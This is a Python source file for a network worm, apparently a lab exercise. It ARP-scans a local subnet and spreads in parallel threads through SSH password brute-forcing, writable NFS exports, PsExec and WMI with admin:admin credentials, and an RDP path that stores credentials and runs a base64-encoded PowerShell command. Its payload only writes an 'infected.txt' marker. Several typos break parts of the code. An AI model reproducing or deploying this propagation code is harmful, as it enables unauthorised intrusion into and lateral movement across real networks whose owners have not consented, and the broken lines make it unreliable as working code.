from scapy.all import ARP, Ether, srp
import paramiko 
import threading
import os 
import wmi
import win32net
import win32api
import pythoncom
import base64
import socket


def payload():
    with open('infected.txt', 'w') as f:
        f.write("This system has been infected.")
    print("Payload executed: infected.txt created.")

def generate_worm_code():
    return '''import os 

def payload():
        home_dir = os.path.expanduser('~')
        infected_file = os.path.join(home_dir, 'infected.txt')
        with open(infected_file, 'w') as f:
            f.write("This system has been infected.")
        print("Payload executed: infected.txt created.")
    
def main():
     payload()

if __name__ == '__main__':
     main()
'''


def spread_ssh(target_ip):
    try:
        print(f"Attempting SSH exploit on {target_ip}")
        username = 'kali'
        passwords = ['12345', '1234']
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        worm_code = generate_worm_code()
        for password in passwords:
            try:
                client.connect(target_ip, username=username, password=password)

                sftp = client.open_sftp()
                with sftp.file('/tmp/worm.py', 'w') as f:
                    f.write(worm_code)
                sftp.close()

                stdin, stdout, stderr = client.exec_command('python3 /tmp/worm.py')
                stdout_output = stdout.read().decode()
                stderr_output = stderr.read().decode()
                print(f'SSH exploit succeed on {target_ip} with password {password}')
                print(f'STDOUT: {stdout_output}')
                if stderr_output:
                    print(f'STDERR: {stderr_output}')

                stdin, stdout, stderr = client.exec_command('echo $HOME')
                home_dir = stdout.read().decode().strip()
                infected_file = f'{home_dir}/infected.txt'

                sftp = client.open_sftp()
                try:
                    sftp.stat(infected_file)
                    print(f'{infected_file} exsits on {target_ip}')
                except FileNotFoundError:
                    print(f'{infected_file} does not exsists on {target_ip}')
                sftp.close()
                break
            except paramiko.AuthenticationException:
                continue
    except Exception as e:
        print(f"Error in SSH exploit: {e}")

def nfs_spread(target_ip):
    try:
        print(f'Attempting NFS exploit on {target_ip}')
        os.system(f'showmount -e {target_ip}')
        os.system(f'mount -t nfs {target_ip}:/export /mnt')
        payload = generate_worm_code()
        with open('/mnt/worm.py', 'w') as f:
            f.write(payload)
        os.sytem('umount /mnt')
        print(f"NFS exploit succeeded on {target_ip}")
    except Exception as e:
        print(f"Error in NFS exploit: {e}")

def psexec_lateral_movement(target_ip, username, password):
    try:
        print(f'Attempting PsExec lateral movement on {target_ip}')
        payload = generate_worm_code()
        with open('worm.bat', 'w') as f:
            f.write(payload)
        os.system(f'psexec \\\\{target_ip} -u {username} -p {password} -c worm.py')
        print(f"PsExec lateral movement suceeded on {target_ip}")
    except Exception as e:
        print(f'Error in PsExec exploit: {e}')

def wmi_lateral_movement(target_ip, username, password):
    try:
        print(f'Attempting WMI lateral movemnt on {target_ip}')
        pythoncom.CoInitialize()
        connection = wmi.WMI(target_ip, user=username, password=password)
        process_startup = connection.Win32_ProcessStartup.new()
        process_id, result = connection.Win32_Process.Create(
            CommandLine = 'cmd.exe /c "echo This system is infected. > infected.txt"',
            ProcessStartupInformation =process_startup
        )
        if result == 0:
            print(f'WMI lateral movement succeeded on {target_ip}, process ID: {process_id}')
        else:
            print(f'WMI lateral movemnt failed on {target_ip}, error code: {result}')
    except Exception as e:
        print(f'Error in WMI leteral movemnt: {e}')

def spread_rdp(target_ip):
    try:
        print(f"Attempting RDP exploit on {target_ip}")

        powershell_script = '''
        $path = 'C:\\infected.txt';
        $content = 'This system is infected.';
        New-Item -Path $path -ItemType 'file' -Value $content;
        '''

        encoded_script = base64.b64encode(powershell_script.encode('utf-16le')).decode()

        payload = f'''
        powerhsell -EncodedCommand {encoded_script}
        '''

        username = 'admin'
        password = 'admin'

        os.system(f'cmdkey /generic:TERMSRV/{target_ip} /user:{username} /pass:{password}')
        os.system(f'mstsc /v:{target_ip} /admin /f')
        os.system(f'psexec \\\\{target_ip} -u {username} -p {password} {payload}')

        print(f'RDP exploit executed on {target_ip}')
    except Exception as e:
        print(f'Error in RDP exploit: {e}')
        
def scan_network(ip_range):
    alive_hosts = []

    arp = ARP(pdst=ip_range)
    ether = Ether(dst='ff:ff:ff:ff:ff:ff')
    packet = ether/arp

    result = srp(packet, timeout=2, verbose=0)[0]

    for sent, recieved in result:
        alive_hosts.append(recieved.psrc)
    
    return alive_hosts

def main():
    payload()
    target_ips = scan_network('192.168.1.0/24')
    if not target_ips:
        print("No target found.")
        return 
    print(f'Targets found: {target_ips}')
    for ip in target_ips:
        threading.Thread(target=spread_ssh, args=(ip,)).start()
        threading.Thread(target=nfs_spread, args=(ip,)).start()
        threading.Thread(target=psexec_lateral_movement, args=(ip, 'admin', 'admin')).start()
        threading.Thread(target=wmi_lateral_movement, args=(ip, 'admin', 'admin')).start()
        threading.Thread(target=spread_rdp, args=(ip,)).start()


if __name__ == '__main__':
    main()
        